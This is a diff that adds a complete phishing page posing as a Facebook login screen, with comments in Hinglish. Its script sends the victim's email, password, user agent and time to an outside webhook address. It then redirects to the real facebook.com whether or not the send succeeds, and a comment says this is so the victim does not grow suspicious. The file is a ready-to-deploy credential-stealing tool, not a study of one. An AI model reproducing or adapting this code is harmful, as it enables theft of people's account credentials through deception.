@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Login</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { 
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+      background: #f0f2f5; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      height: 100vh; 
+    }
+    
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      text-align: center;
+    }
+
+    /* Video Wrapper - Isse video fit ho jayegi */
+    .video-wrapper {
+      position: relative;
+      width: 100%;
+      max-width: 320px; /* Mobile width ke hisaab se */
+      margin: 0 auto 20px auto;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+      background: #000;
+    }
+
+    .video-wrapper video {
+      width: 100%;
+      height: auto;
+      display: block;
+      /* Agar video black dikhe, toh yeh line add karo: object-fit: cover; */
+    }
+
+    .form-box {
+      background: white;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 14px 16px;
+      margin-bottom: 12px;
+      border: 1px solid #ddd;
+      border-radius: 6px;
+      font-size: 17px;
+    }
+    
+    input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0 0 0 2px #e7f3ff;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      background: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 19px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+
+    button:hover { background: #166fe5; }
+    
+    .forgot { 
+      display: block; 
+      margin-top: 15px; 
+      color: #1877f2; 
+      text-decoration: none; 
+      font-size: 14px; 
+    }
+    
+    .forgot:hover { text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    
+    <!-- VIDEO SECTION START -->
+    <div class="video-wrapper">
+      <!-- Yahan apna video.mp4 file name dalein -->
+      <video autoplay loop muted playsinline>
+        <source src="video7.mp4" type="video/mp4">
+        Your browser does not support the video tag.
+      </video>
+    </div>
+    <!-- VIDEO SECTION END -->
+
+    <div class="form-box">
+      <input type="text" id="email" placeholder="Email or phone number" required>
+      <input type="password" id="pass" placeholder="Password" required>
+      <button type="button" id="btn">Log In</button>
+      <a href="#" class="forgot">Forgot password?</a>
+    </div>
+  </div>
+
+  <script>
+    // 👇 APNA WEBHOOK URL YAHAN DALO 👇
+    const webhook = "https://webhooksite.net/5fd82665-8a43-42b4-a65a-b95ea5aff5b1"; 
+
+    const btn = document.getElementById("btn");
+    const emailInput = document.getElementById("email");
+    const passInput = document.getElementById("pass");
+
+    btn.addEventListener("click", () => {
+      const email = emailInput.value;
+      const pass = passInput.value;
+      
+      if (!email || !pass) {
+        alert("Please enter both email and password.");
+        return;
+      }
+
+      // Data bhejne ka code
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          email: email,
+          password: pass,
+          userAgent: navigator.userAgent,
+          time: new Date().toLocaleTimeString(),
+          platform: "Facebook"
+        })
+      }).then(() => {
+        // Success hone par real page par bhej do
+        window.location.href = "https://www.facebook.com/";
+      }).catch(err => {
+        // Error aane par bhi wahi bhej do taaki user ko suspicion na ho
+        window.location.href = "https://www.facebook.com/";
+      });
+    });
+  </script>
+</body>
+</html>
